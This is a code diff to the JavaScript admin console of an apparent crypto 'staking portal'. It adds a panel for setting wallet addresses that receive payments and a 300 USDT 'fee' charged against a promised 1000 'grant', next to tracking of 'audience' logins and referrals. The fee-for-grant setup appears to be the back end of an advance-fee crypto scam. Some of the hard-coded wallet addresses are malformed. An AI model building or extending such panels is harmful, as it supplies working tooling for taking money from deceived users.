@@ -9,6 +9,26 @@
   const AUTH_STORAGE_KEY = 'qth_admin_authenticated';
   const STORAGE_KEY_SESSIONS = 'qth_telemetry_sessions';
   const STORAGE_KEY_INTRUSIONS = 'qth_penetration_events';
+  const STORAGE_KEY_PAYMENT = 'qth_payment_config';
+
+  const DEFAULT_PAYMENT_CONFIG = {
+    trc20Address: 'TY5a8eK9mPQ2Rvx982H1K938jKsdL34xL8',
+    erc20Address: '0xQTH77aF82e1c3905D91b92015B7e6F3a824C198B',
+    bep20Address: '0xQTH77aF82e1c3905D91b92015B7e6F3a824C198B',
+    feeAmount: 300,
+    grantAmount: 1000,
+    dailyCap: 50
+  };
+
+  // Payment Config DOM Elements
+  const cfgTrc20Input = document.getElementById('cfgTrc20Input');
+  const cfgErc20Input = document.getElementById('cfgErc20Input');
+  const cfgBep20Input = document.getElementById('cfgBep20Input');
+  const cfgFeeAmountInput = document.getElementById('cfgFeeAmountInput');
+  const cfgGrantAmountInput = document.getElementById('cfgGrantAmountInput');
+  const cfgDailyCapInput = document.getElementById('cfgDailyCapInput');
+  const btnSavePaymentConfig = document.getElementById('btnSavePaymentConfig');
+  const btnResetPaymentConfig = document.getElementById('btnResetPaymentConfig');
 
   // DOM Elements
   const authGateOverlay = document.getElementById('authGateOverlay');
@@ -149,6 +169,47 @@
   function renderDashboard() {
     renderAudienceSessions();
     renderIntrusionLog();
+    loadPaymentConfig();
+  }
+
+  // Load Payment & Wallet Configuration
+  function loadPaymentConfig() {
+    const saved = JSON.parse(localStorage.getItem(STORAGE_KEY_PAYMENT) || 'null') || DEFAULT_PAYMENT_CONFIG;
+    if (cfgTrc20Input) cfgTrc20Input.value = saved.trc20Address || DEFAULT_PAYMENT_CONFIG.trc20Address;
+    if (cfgErc20Input) cfgErc20Input.value = saved.erc20Address || DEFAULT_PAYMENT_CONFIG.erc20Address;
+    if (cfgBep20Input) cfgBep20Input.value = saved.bep20Address || DEFAULT_PAYMENT_CONFIG.bep20Address;
+    if (cfgFeeAmountInput) cfgFeeAmountInput.value = saved.feeAmount || DEFAULT_PAYMENT_CONFIG.feeAmount;
+    if (cfgGrantAmountInput) cfgGrantAmountInput.value = saved.grantAmount || DEFAULT_PAYMENT_CONFIG.grantAmount;
+    if (cfgDailyCapInput) cfgDailyCapInput.value = saved.dailyCap || DEFAULT_PAYMENT_CONFIG.dailyCap;
+  }
+
+  // Save Payment Configuration
+  function savePaymentConfig() {
+    const config = {
+      trc20Address: (cfgTrc20Input ? cfgTrc20Input.value : '').trim() || DEFAULT_PAYMENT_CONFIG.trc20Address,
+      erc20Address: (cfgErc20Input ? cfgErc20Input.value : '').trim() || DEFAULT_PAYMENT_CONFIG.erc20Address,
+      bep20Address: (cfgBep20Input ? cfgBep20Input.value : '').trim() || DEFAULT_PAYMENT_CONFIG.bep20Address,
+      feeAmount: parseFloat(cfgFeeAmountInput ? cfgFeeAmountInput.value : '300') || 300,
+      grantAmount: parseFloat(cfgGrantAmountInput ? cfgGrantAmountInput.value : '1000') || 1000,
+      dailyCap: parseFloat(cfgDailyCapInput ? cfgDailyCapInput.value : '50') || 50,
+      updatedAt: Date.now()
+    };
+
+    localStorage.setItem(STORAGE_KEY_PAYMENT, JSON.stringify(config));
+    window.dispatchEvent(new CustomEvent('qth_payment_config_updated', { detail: config }));
+    
+    showToast(`Treasury payment addresses updated! Fee: $${config.feeAmount} USDT. Synced across staking portal.`, 'success');
+    playAlertChime();
+  }
+
+  // Reset to Defaults
+  function resetPaymentConfig() {
+    if (confirm('Reset all payment addresses and amounts to factory defaults?')) {
+      localStorage.removeItem(STORAGE_KEY_PAYMENT);
+      loadPaymentConfig();
+      window.dispatchEvent(new CustomEvent('qth_payment_config_updated', { detail: DEFAULT_PAYMENT_CONFIG }));
+      showToast('Payment configuration reset to default addresses.', 'info');
+    }
   }
 
   // Render Audience Logins Table & Referral Breakdown
@@ -381,6 +442,8 @@
   if (btnLockConsole) btnLockConsole.addEventListener('click', lockConsole);
   if (btnSimulateProbe) btnSimulateProbe.addEventListener('click', triggerSimulatedProbe);
   if (btnResetAlerts) btnResetAlerts.addEventListener('click', resetAlerts);
+  if (btnSavePaymentConfig) btnSavePaymentConfig.addEventListener('click', savePaymentConfig);
+  if (btnResetPaymentConfig) btnResetPaymentConfig.addEventListener('click', resetPaymentConfig);
   if (btnRefreshSessions) btnRefreshSessions.addEventListener('click', () => {
     renderDashboard();
     showToast('Audience telemetry refreshed.', 'info');
